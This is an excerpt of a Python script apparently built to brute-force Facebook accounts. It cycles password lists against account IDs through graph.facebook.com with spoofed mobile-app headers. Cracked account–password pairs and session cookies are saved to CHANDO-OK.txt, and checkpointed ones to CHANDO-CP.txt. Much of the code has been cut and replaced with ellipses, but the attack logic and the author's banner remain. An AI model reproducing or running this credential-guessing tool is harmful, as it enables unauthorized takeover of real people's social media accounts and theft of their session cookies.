...
\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mCHANDO

\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mCHAND.SA LARKA

\033[1;97m[+]\033[1;91m    GITHUB \033[1;90m: \033[1;92m  CHANDSALARKA
...
def method():
    ...
    print(f"{oo('•')} FILE SAVE IN /sdcard/CHANDO-OK.txt")
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mCHANDO-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                open('/sdcard/CHANDO-OK.txt','a').write(f'{acc} | {pword}\n')
                ...
                if c=='y':
                    ...
                    try:
                           ...
                           open('/sdcard/CHANDO-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93mCHANDO-CP\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/CHANDO-CP.txt','a').write(f'{acc} | {pword}\n')
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;92mCHANDO-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/CHANDO-OK.txt")
    ...
    def start(user):
     ...
     try:
        ...
        for pword in totalpass:              
            ...
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": CHAND_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mCHANDO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mCHANDO-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mCHANDO-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mACHANDO-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
